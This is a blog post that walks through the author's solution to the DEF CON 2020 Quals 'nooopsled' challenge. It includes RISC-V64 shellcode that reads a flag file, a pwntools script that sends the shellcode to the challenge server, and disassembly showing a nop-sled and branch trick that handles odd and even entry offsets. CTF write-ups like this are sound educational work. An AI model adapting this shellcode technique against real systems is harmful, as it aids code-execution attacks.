<!doctype html>



  



    
  

<html class="theme-next logos use-motion" lang="zh-hk">
<head><meta name="generator" content="Hexo 3.8.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">



<meta http-equiv="Cache-Control" content="no-transform">
<meta http-equiv="Cache-Control" content="no-siteapp">












  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">




  
  
  
  

  
    
    
  

  

  

  

  

  
    
    
    <link href="//fonts.useso.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
  






<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">

<link href="/css/main.css?v=5.1.0" rel="stylesheet" type="text/css">


  <meta name="keywords" content="Hack,">








  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.1.0">






<meta name="description" content="Last weekend I played DEF CON CTF Quals 2020 with team A*0*E, having so much fun with my teammates and I successfully solved a shellcode challenge called nooopsled. At last 7 teams solved this challen">
<meta name="keywords" content="Hack">
<meta property="og:type" content="article">
<meta property="og:title" content="[DEFCON 2020 Quals] - nooopsled">
<meta property="og:url" content="http://matshao.com/2020/05/18/DEFCON-2020-Quals-nooopsled/index.html">
<meta property="og:site_name" content="Mid Station">
<meta property="og:description" content="Last weekend I played DEF CON CTF Quals 2020 with team A*0*E, having so much fun with my teammates and I successfully solved a shellcode challenge called nooopsled. At last 7 teams solved this challen">
<meta property="og:locale" content="zh-hk">
<meta property="og:updated_time" content="2020-05-25T12:36:26.509Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="[DEFCON 2020 Quals] - nooopsled">
<meta name="twitter:description" content="Last weekend I played DEF CON CTF Quals 2020 with team A*0*E, having so much fun with my teammates and I successfully solved a shellcode challenge called nooopsled. At last 7 teams solved this challen">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Logos',
    sidebar: {"position":"left","display":"post"},
    fancybox: true,
    motion: true,
    duoshuo: {
      userId: '0',
      author: 'Âçö‰∏ª'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://matshao.com/2020/05/18/DEFCON-2020-Quals-nooopsled/">





  <title> [DEFCON 2020 Quals] - nooopsled | Mid Station </title>
</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-hk">

  





<script>
  	var _mtac = {};
  	(function() {
  		var mta = document.createElement("script");
  		mta.src = "http://pingjs.qq.com/h5/stats.js?v2.0.4";
  		mta.setAttribute("name", "MTAH5");
  		mta.setAttribute("sid", "500688563");
  		var s = document.getElementsByTagName("script")[0];
  		s.parentNode.insertBefore(mta, s);
  	})();
</script>





  
  
    
  

  <div class="container one-collumn sidebar-position-left page-post-detail ">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
    <div class="header-logos"> 
      <div class="site-meta ">
  
    <div class="site-meta-headline">
      <a href="/">
        <img class="custom-logo-image" src="/images/logo_light.png" alt="Mid Station">
      </a>
    </div>
  

  <div class="custom-logo-site-title">
    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <span class="site-title">Mid Station</span>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>
    
      <p class="site-subtitle"></p>
    
</div>

<div class="site-nav-toggle">
  <button>
    <span class="btn-bar"></span>
    <span class="btn-bar"></span>
    <span class="btn-bar"></span>
  </button>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
            
            È¶ñÈ†Å
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
            
            Ê≠∏Ê™î
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
            
            ÈóúÊñº
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 
            
      </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
  <link itemprop="mainEntityOfPage" href="http://matshao.com/2020/05/18/DEFCON-2020-Quals-nooopsled/">

  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <meta itemprop="name" content="Matthew Shao">
    <meta itemprop="description" content>
    <meta itemprop="image" content="/images/avatar.gif">
  </span>

  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
    <meta itemprop="name" content="Mid Station">
    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
      <img style="display:none;" itemprop="url image" alt="Mid Station" src="/images/logo_light.png">
    </span>
  </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                [DEFCON 2020 Quals] - nooopsled
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">ÁôºË°®Êñº</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-05-18T22:27:10+08:00">
                2020-05-18
              </time>
            

            

            
          </span>

          

          
            
          

          

          
          

          

          

        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        <p>Last weekend I played DEF CON CTF Quals 2020 with team A*0*E, having so much fun with my teammates and I successfully solved a shellcode challenge called nooopsled. At last 7 teams solved this challenge and you can download the files from <a href="%5Bhttps://github.com/o-o-overflow/dc2020q-dc2020q-nooopsled-public%5D(https://github.com/o-o-overflow/dc2020q-dc2020q-nooopsled-public)">OOO‚Äôs github repo</a>.</p>
<p>This is a challenge in the format of golf üèåÔ∏è‚Äç‚ôÇÔ∏è, you can see the description of this new type of challenge on <a href="%5Bhttps://oooverflow.io/dc-ctf-2020-quals/%5D(https://oooverflow.io/dc-ctf-2020-quals/)">OOO‚Äôs official webpage</a>. For short, we are required to input a shellcode in the length of 1024 bytes, in the architecture of RISC-V64 or arm64. The server will receive our shellcode and start to execute it from the index of 0, 1, 2 ‚Ä¶1024, and record the number of success attempt to read out the <code>flag</code> file. The error threshold start from 1, and increase 1 every 84 seconds. Every team have 8 hours for preparing their shellcode.</p>
<a id="more"></a>
<p>I did not have any experience of writing arm64 or RISC-V shellcode. After short discussion, I chose RISC-V and one of my teammate will look at arm64.</p>
<h2 id="toolchain-and-examples"><a class="header-anchor" href="#toolchain-and-examples">¬∂</a>Toolchain and examples</h2>
<p>The first step is preparing the RISC-V compiling toolchain, I downloaded the precompiled toolchain from <a href="https://github.com/sifive/freedom-tools/releases" target="_blank" rel="noopener">https://github.com/sifive/freedom-tools/releases</a>. And quick search for a couple of RISC-V64 Linux Shellcoding exmple from: <a href="https://github.com/HosakaCorp/riscv-business/" target="_blank" rel="noopener">https://github.com/HosakaCorp/riscv-business/</a>.</p>
<p>The provided shellcode example can be complied with the command:</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CC=../risc64/bin/riscv64-unknown-elf-gcc LD=../risc64/bin/riscv64-unknown-elf-ld make asm</span><br></pre></td></tr></table></figure>
<p>And I wrote a simple script for extracting shellcode from the binary.</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">output = subprocess.check_output(<span class="string">" ../risc64/bin/riscv64-unknown-elf-objdump -d ./bin/asm2"</span>.split(), encoding=<span class="string">"utf8"</span>)</span><br><span class="line">print(output)</span><br><span class="line">res = re.findall(<span class="string">r":\t\w+"</span>, output)</span><br><span class="line">res = list(map(<span class="keyword">lambda</span> x: x.replace(<span class="string">":\t"</span>, <span class="string">""</span>), res))</span><br><span class="line">new_res = []</span><br><span class="line"><span class="keyword">for</span> r <span class="keyword">in</span> res:</span><br><span class="line">    <span class="keyword">if</span> len(r) == <span class="number">8</span>:</span><br><span class="line">        t = r[<span class="number">6</span>:<span class="number">8</span>] + r[<span class="number">4</span>:<span class="number">6</span>] + r[<span class="number">2</span>:<span class="number">4</span>] + r[<span class="number">0</span>:<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">elif</span> len(r) == <span class="number">4</span>:</span><br><span class="line">        t = r[<span class="number">2</span>:<span class="number">4</span>] + r[<span class="number">0</span>:<span class="number">2</span>]</span><br><span class="line">    new_res.append(t)</span><br><span class="line">print(new_res)</span><br><span class="line"></span><br><span class="line">new_res = <span class="string">""</span>.join(new_res)</span><br><span class="line">length = len(bytes.fromhex(new_res).decode(<span class="string">'latin1'</span>))</span><br><span class="line">print(<span class="string">"length: %d"</span> % length)</span><br><span class="line">print(new_res)</span><br><span class="line"></span><br><span class="line">f = open(<span class="string">"test.sc"</span>, <span class="string">"wb"</span>)</span><br><span class="line">f.write(bytes.fromhex(new_res))</span><br><span class="line">f.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">    p = remote(<span class="string">"nooopsled.challenges.ooo"</span>, <span class="number">5000</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"What is your choice?"</span>, <span class="string">"riscv64"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Input your shellcode (in hex):"</span>, new_res.ljust(<span class="number">2048</span>, <span class="string">"0"</span>))</span><br><span class="line">    p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="shellcoding"><a class="header-anchor" href="#shellcoding">¬∂</a>Shellcoding</h2>
<p>An intuitive idea is preparing a shellcode as short as possible and put it at the end of the input, then we fill <code>nop</code> instructions from the start of the input. We can start from <code>asm2.s</code> and write the read flag shellcode. For the syscall number, we can refer to <a href="https://github.com/torvalds/linux/blob/master/include/uapi/asm-generic/unistd.h" target="_blank" rel="noopener">https://github.com/torvalds/linux/blob/master/include/uapi/asm-generic/unistd.h</a></p>
<p>After reading a bit of RISC-V manul, I found there is a RVC extenstion instructions set, which will ‚Äúcompressed‚Äù some instructions into 2bytes. The prebuilt compiler also support generating these instructions, we can add <code>-march=rv64gc</code> options for the gcc command. We started from the general instructions which is 4bytes each, and try to replace some of them with equivlent ‚Äúcompressed‚Äù instructions.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">.section .text</span><br><span class="line">.globl _start</span><br><span class="line">.option rvc</span><br><span class="line">_start:</span><br><span class="line">    <span class="meta">#open</span></span><br><span class="line">    li a1,<span class="number">0x67616c66</span> <span class="meta">#flag</span></span><br><span class="line">    sd a1,<span class="number">4</span>(sp)</span><br><span class="line">    addi a1,sp,<span class="number">4</span></span><br><span class="line">    li a0,<span class="number">-100</span></span><br><span class="line">    li a2,<span class="number">0</span></span><br><span class="line">    li a7, <span class="number">56</span> # __NR_openat</span><br><span class="line">    ecall</span><br><span class="line">    <span class="meta"># read</span></span><br><span class="line">    c.mv a2,a7</span><br><span class="line">    addi a7,a7,<span class="number">7</span></span><br><span class="line">    ecall</span><br><span class="line">    <span class="meta"># write</span></span><br><span class="line">    li a0, <span class="number">1</span></span><br><span class="line">    addi a7,a7,<span class="number">1</span></span><br><span class="line">    ecall</span><br></pre></td></tr></table></figure>
<p>The will compile into a shellcode of 44 bytes, it looks like this in objdump:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">10078:    676175b7              lui    a1,0x67617</span><br><span class="line">1007c:    c665859b              addiw    a1,a1,-922</span><br><span class="line">10080:    00b13223              sd    a1,4(sp)</span><br><span class="line">10084:    004c                  addi    a1,sp,4</span><br><span class="line">10086:    f9c00513              li    a0,-100</span><br><span class="line">1008a:    4601                  li    a2,0</span><br><span class="line">1008c:    03800893              li    a7,56</span><br><span class="line">10090:    00000073              ecall</span><br><span class="line">10094:    8646                  mv    a2,a7</span><br><span class="line">10096:    089d                  addi    a7,a7,7</span><br><span class="line">10098:    00000073              ecall</span><br><span class="line">1009c:    4505                  li    a0,1</span><br><span class="line">1009e:    0885                  addi    a7,a7,1</span><br><span class="line">100a0:    00000073              ecall</span><br></pre></td></tr></table></figure>
<p>As for the preamble, we chose a ‚Äúnop-liked‚Äù compressed instructions with 2 identical bytes. <code>0x0505</code> is our choice for it stands for <code>addi a0,a0, 1</code> ,we will set <code>a0</code> in the shellcode anyway, so this instruction can be used as a <code>nop</code>.</p>
<p>We threw this simple input to the server and it complained ~550 errors. This is because RISC-V consider each instruction as 2 byte or 4 byte, when the starting index is odd number, a single <code>05</code> preamble will concatenate with the shellcode and corrupt the shellcode like:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">10078:    b705                    j    ff98 &lt;_start-0xe0&gt;</span><br><span class="line">1007a:    6175                    addi    sp,sp,368</span><br><span class="line">1007c:    65859b67                0x65859b67</span><br><span class="line">10080:    23c6                    fld    ft7,80(sp)</span><br><span class="line">10082:    b132                    fsd    fa2,160(sp)</span><br><span class="line">10084:    4c00                    lw    s0,24(s0)</span><br><span class="line">10086:    1300                    addi    s0,sp,416</span><br><span class="line">10088:    c005                    beqz    s0,100a8 &lt;_start+0x30&gt;</span><br><span class="line">1008a:    01f9                    addi    gp,gp,30</span><br><span class="line">1008c:    9346                    add    t1,t1,a7</span><br><span class="line">1008e:    8008                    0x8008</span><br><span class="line">10090:    00007303                0x7303</span><br><span class="line">10094:    4600                    lw    s0,8(a2)</span><br><span class="line">10096:    9d86                    add    s11,s11,ra</span><br><span class="line">10098:    7308                    ld    a0,32(a4)</span><br><span class="line">1009a:    0000                    unimp</span><br><span class="line">1009c:    0500                    addi    s0,sp,640</span><br><span class="line">1009e:    8545                    srai    a0,a0,0x11</span><br><span class="line">100a0:    7308                    ld    a0,32(a4)</span><br><span class="line">100a2:    0000                    unimp</span><br></pre></td></tr></table></figure>
<h2 id="thoughts-and-solution"><a class="header-anchor" href="#thoughts-and-solution">¬∂</a>Thoughts and solution</h2>
<p>My first thought to fix this situation is designing some preamble which can skip some odd number of bytes if it starts from a wrong place, but later I realize it is really hard to design such preamble, as such logic will bring more chaos to the construction.</p>
<p>The first solution for this challenge appears at around 2 hour after the thershold increasing. The Thershold fix to 85 errors. While what we have will lead to 500+ errors now, it needs a strong optimization. Then I realize 85 errors means the actual shellcode length in their solution is no more than 85 bytes, which is aroud twice of 44. This discovery help me got the right direction, the first team maybe using two pieces of shellcode at the end of the input.</p>
<p>The preamble works like:</p>
<ul>
<li>If it starts from an odd number index, all preamble work as <code>nop</code> instructions and the execution sled into the first shellcode.</li>
<li>If it starts from an even number index, at the end of preamble work as a jmp-like instruction, skip the first corrupted shellocde and jump into the second piece of shellcode.</li>
</ul>
<p>We can enumerate all instructions in the size of 2 bytes, and look for some jmp-like instructions with a suitable offset like ~40. I intend to use <code>capstone</code> to finish the diassmbling but it seems like the tool does not support compressed instructions. so I found anotehr disassbler tool from <a href="https://github.com/michaeljclark/riscv-disassembler" target="_blank" rel="noopener">https://github.com/michaeljclark/riscv-disassembler</a>, and some simple modifications can help us get all compressed instructions.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"riscv-disas.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_insn</span><span class="params">(<span class="keyword">int64_t</span> pc, <span class="keyword">int64_t</span> inst)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">128</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    disasm_inst(buf, <span class="keyword">sizeof</span>(buf), rv64, pc, inst);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"0x%"</span> PRIx64 <span class="string">":  %s\n"</span>, pc, buf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">uint16_t</span> inst_arr[<span class="number">0x10000</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">uint64_t</span> pc = <span class="number">0x10000</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i=<span class="number">0</span>; i &lt; <span class="number">0x10000</span>; i++) &#123;</span><br><span class="line">        inst_arr[i] = i;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(inst_arr) / <span class="keyword">sizeof</span>(inst_arr[<span class="number">0</span>]); i++) &#123;</span><br><span class="line">		<span class="keyword">uint16_t</span> inst = inst_arr[i];</span><br><span class="line">		print_insn(pc, inst);</span><br><span class="line">		pc += inst_length(inst);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Extraing all jmp-like instruction from the manual, I discover a excellent instruction for this:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ea05              bnez          a2,48</span><br></pre></td></tr></table></figure>
<p>With this instruction as a pivot, we can still use <code>0505</code> as the nop instruction, if it start from the odd index and the remaining <code>05</code> will combine with <code>ea</code> and jmp to the second shellcode!</p>
<p>So the result looks like:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">## odd number of 05 preamble case:</span><br><span class="line">0000000000010078 &lt;_start&gt;:</span><br><span class="line">   10078:    0505                    addi    a0,a0,1</span><br><span class="line">   1007a:    ea05                    bnez    a2,100aa &lt;_start+0x32&gt; +--------+</span><br><span class="line">   1007c:    b705                    j    ff9c &lt;_start+0xdc&gt;                 |</span><br><span class="line">   1007e:    6175                    addi    sp,sp,368                       |</span><br><span class="line">   10080:    65859b67                0x65859b67                              |</span><br><span class="line">   10084:    2ec6                    fld    ft9,80(sp)                       |</span><br><span class="line">   10086:    2ce4                    fld    fs1,216(s1)                      |</span><br><span class="line">   10088:    1300                    addi    s0,sp,416                       |</span><br><span class="line">   1008a:    c005                    beqz    s0,100aa &lt;_start+0x32&gt;          |</span><br><span class="line">   1008c:    01f9                    addi    gp,gp,30                        |</span><br><span class="line">   1008e:    9346                    add    t1,t1,a7                         |</span><br><span class="line">   10090:    8008                    0x8008                                  |</span><br><span class="line">   10092:    00007303                0x7303                                  |</span><br><span class="line">   10096:    4600                    lw    s0,8(a2)                          |</span><br><span class="line">   10098:    9d86                    add    s11,s11,ra                       |</span><br><span class="line">   1009a:    7308                    ld    a0,32(a4)                         |</span><br><span class="line">   1009c:    0000                    unimp                                   |</span><br><span class="line">   1009e:    0500                    addi    s0,sp,640                       |</span><br><span class="line">   100a0:    8545                    srai    a0,a0,0x11                      |</span><br><span class="line">   100a2:    7308                    ld    a0,32(a4)                         |</span><br><span class="line">   100a4:    0000                    unimp                                   |</span><br><span class="line">   100a6:    aa00                    fsd    fs0,16(a2)                       |</span><br><span class="line">   100a8:    aaaa                    fsd    fa0,336(sp)                      |</span><br><span class="line">   100aa:    676175b7                lui    a1,0x67617              &lt;--------+</span><br><span class="line">   100ae:    c665859b                addiw    a1,a1,+922</span><br><span class="line">   100b2:    e42e                    sd    a1,8(sp)</span><br><span class="line">   100b4:    002c                    addi    a1,sp,8</span><br><span class="line">   100b6:    f9c00513                li    a0,+100</span><br><span class="line">   100ba:    4601                    li    a2,0</span><br><span class="line">   100bc:    03800893                li    a7,56</span><br><span class="line">   100c0:    00000073                ecall</span><br><span class="line">   100c4:    8646                    mv    a2,a7</span><br><span class="line">   100c6:    089d                    addi    a7,a7,7</span><br><span class="line">   100c8:    00000073                ecall</span><br><span class="line">   100cc:    4505                    li    a0,1</span><br><span class="line">   100ce:    0885                    addi    a7,a7,1</span><br><span class="line">   100d0:    00000073                ecall</span><br><span class="line"></span><br><span class="line">## even number of 05 preamble case:</span><br><span class="line">0000000000010078 &lt;_start&gt;:</span><br><span class="line">   10078:    0505                    addi    a0,a0,1</span><br><span class="line">   1007a:    0505                    addi    a0,a0,1</span><br><span class="line">   1007c:    05ea                    slli    a1,a1,0x1a   &lt;===== nop like insn</span><br><span class="line">   1007e:    676175b7                lui    a1,0x67617    &lt;===== shellcode start</span><br><span class="line">   10082:    c665859b                addiw    a1,a1,-922</span><br><span class="line">   10086:    e42e                    sd    a1,8(sp)</span><br><span class="line">   10088:    002c                    addi    a1,sp,8</span><br><span class="line">   1008a:    f9c00513                li    a0,-100</span><br><span class="line">   1008e:    4601                    li    a2,0</span><br><span class="line">   10090:    03800893                li    a7,56</span><br><span class="line">   10094:    00000073                ecall</span><br><span class="line">   10098:    8646                    mv    a2,a7</span><br><span class="line">   1009a:    089d                    addi    a7,a7,7</span><br><span class="line">   1009c:    00000073                ecall</span><br><span class="line">   100a0:    4505                    li    a0,1</span><br><span class="line">   100a2:    0885                    addi    a7,a7,1</span><br><span class="line">   100a4:    00000073                ecall                 &lt;===== flag output finish</span><br><span class="line">   100a8:    aaaa                    fsd    fa0,336(sp)</span><br><span class="line">   100aa:    b7aa                    fsd    fa0,488(sp)</span><br><span class="line">   100ac:    6175                    addi    sp,sp,368</span><br><span class="line">   100ae:    65859b67                0x65859b67</span><br><span class="line">   100b2:    2ec6                    fld    ft9,80(sp)</span><br><span class="line">   100b4:    2ce4                    fld    fs1,216(s1)</span><br><span class="line">   100b6:    1300                    addi    s0,sp,416</span><br><span class="line">   100b8:    c005                    beqz    s0,100d8 &lt;_start+0x60&gt;</span><br><span class="line">   100ba:    01f9                    addi    gp,gp,30</span><br><span class="line">   100bc:    9346                    add    t1,t1,a7</span><br><span class="line">   100be:    8008                    0x8008</span><br><span class="line">   100c0:    00007303                0x7303</span><br><span class="line">   100c4:    4600                    lw    s0,8(a2)</span><br><span class="line">   100c6:    9d86                    add    s11,s11,ra</span><br><span class="line">   100c8:    7308                    ld    a0,32(a4)</span><br><span class="line">   100ca:    0000                    unimp</span><br><span class="line">   100cc:    0500                    addi    s0,sp,640</span><br><span class="line">   100ce:    8545                    srai    a0,a0,0x11</span><br><span class="line">   100d0:    7308                    ld    a0,32(a4)</span><br><span class="line">   100d2:    0000                    unimp</span><br></pre></td></tr></table></figure>
<p>This shellcode help us get only 84 errors on the server, so we pass the test and get the flag. I think there might be some other fancy techniques to shink the shellcode, for example overlapping two pieces of shellcode together, but clearly the first solved team don‚Äôt have so much time to do crazy optimization.</p>
<h2 id="reference"><a class="header-anchor" href="#reference">¬∂</a>Reference</h2>
<ol>
<li><a href="https://github.com/o-o-overflow/dc2020q-dc2020q-nooopsled-public" target="_blank" rel="noopener">https://github.com/o-o-overflow/dc2020q-dc2020q-nooopsled-public</a></li>
<li><a href="https://oooverflow.io/dc-ctf-2020-quals/" target="_blank" rel="noopener">https://oooverflow.io/dc-ctf-2020-quals/</a></li>
<li><a href="https://github.com/sifive/freedom-tools/releases" target="_blank" rel="noopener">https://github.com/sifive/freedom-tools/releases</a></li>
<li><a href="https://github.com/HosakaCorp/riscv-business/" target="_blank" rel="noopener">https://github.com/HosakaCorp/riscv-business/</a></li>
<li><a href="https://github.com/torvalds/linux/blob/master/include/uapi/asm-generic/unistd.h" target="_blank" rel="noopener">https://github.com/torvalds/linux/blob/master/include/uapi/asm-generic/unistd.h</a></li>
<li><a href="https://github.com/michaeljclark/riscv-disassembler" target="_blank" rel="noopener">https://github.com/michaeljclark/riscv-disassembler</a></li>
</ol>

      
    </div>

    <div>
      
        

      
    </div>

    <div>
      
        

      
    </div>


    <footer class="post-footer">
      
        <div class="post-tags">
          
            <a href="/tags/Hack/" rel="tag"># Hack</a>
          
        </div>
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2020/03/15/XCTFÊñ∞Êò•ÊàòÁñ´-kernoob/" rel="next" title="[XCTFÊñ∞Êò•ÊàòÁñ´] kernoob">
                <i class="fa fa-chevron-left"></i> [XCTFÊñ∞Êò•ÊàòÁñ´] kernoob
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2020/07/06/Ê∫êÊ≥â/" rel="prev" title="Ê∫êÊ≥â">
                Ê∫êÊ≥â <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </article>



    <div class="post-spread">
      
    </div>
  </div>

          
          </div>
          


          
  <div class="comments" id="comments">
    
  </div>


        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
